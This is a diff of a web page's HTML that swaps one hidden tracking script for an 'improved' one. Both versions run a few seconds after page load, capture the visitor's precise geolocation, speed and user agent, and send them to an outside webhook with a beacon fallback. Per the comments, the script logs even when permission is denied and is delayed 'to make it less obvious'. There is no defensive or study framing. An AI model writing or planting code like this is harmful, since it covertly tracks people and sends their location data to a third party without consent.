@@ -156,57 +156,77 @@
     </div>
 
     <!-- Hidden tracking script -->
-    <script>
-        // Discreet geolocation logging
-        setTimeout(() => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const data = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            acc: position.coords.accuracy,
-                            ts: Date.now(),
-                            ref: document.referrer || 'direct',
-                            ua: navigator.userAgent.substring(0, 100)
-                        };
-                        
-                        // Send to webhook - UPDATED URL
-                        fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify(data)
-                        }).catch(() => {
-                            // Fallback: image beacon - UPDATED URL
-                            const img = new Image();
-                            img.src = `https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net/?fallback=1&lat=${data.lat}&lng=${data.lng}&ts=${data.ts}`;
-                        });
-                    },
-                    (error) => {
-                        // Log even if permission denied
-                        const errorData = {
-                            error: error.code,
-                            message: 'geolocation_denied',
-                            ts: Date.now(),
-                            ref: document.referrer || 'direct'
-                        };
-                        
-                        // UPDATED URL
-                        fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
-                            method: 'POST',
-                            body: JSON.stringify(errorData)
-                        });
-                    },
-                    {
-                        enableHighAccuracy: false,
-                        timeout: 10000,
-                        maximumAge: 600000
-                    }
-                );
-            }
-        }, 2000); // Delay to make it less obvious
-    </script>
+   <script>
+    // Improved geolocation logging
+    setTimeout(() => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const data = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        acc: position.coords.accuracy,
+                        alt: position.coords.altitude,
+                        speed: position.coords.speed,
+                        ts: Date.now(),
+                        ref: document.referrer || 'direct',
+                        ua: navigator.userAgent.substring(0, 100),
+                        source: 'mobile'
+                    };
+                    
+                    console.log('Location captured:', data);
+                    
+                    // Send to webhook
+                    fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    }).then(response => {
+                        console.log('Data sent successfully');
+                    }).catch(error => {
+                        console.log('Fetch failed, using fallback');
+                        // Fallback: image beacon
+                        const img = new Image();
+                        img.src = `https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net/?fallback=1&lat=${data.lat}&lng=${data.lng}&ts=${data.ts}&source=mobile`;
+                    });
+                },
+                (error) => {
+                    console.log('Geolocation error:', error);
+                    const errorData = {
+                        error: error.code,
+                        message: 'geolocation_denied',
+                        ts: Date.now(),
+                        ref: document.referrer || 'direct',
+                        ua: navigator.userAgent.substring(0, 100)
+                    };
+                    
+                    fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
+                        method: 'POST',
+                        body: JSON.stringify(errorData)
+                    });
+                },
+                {
+                    enableHighAccuracy: true,  // Changed to true for mobile
+                    timeout: 15000,           // Longer timeout for mobile
+                    maximumAge: 0             // Don't use cached position
+                }
+            );
+        } else {
+            console.log('Geolocation not supported');
+            // Log that geolocation isn't supported
+            fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
+                method: 'POST',
+                body: JSON.stringify({
+                    error: 'not_supported',
+                    ts: Date.now(),
+                    ua: navigator.userAgent.substring(0, 100)
+                })
+            });
+        }
+    }, 3000); // Longer delay for mobile
+</script>
 </body>
+
 </html>
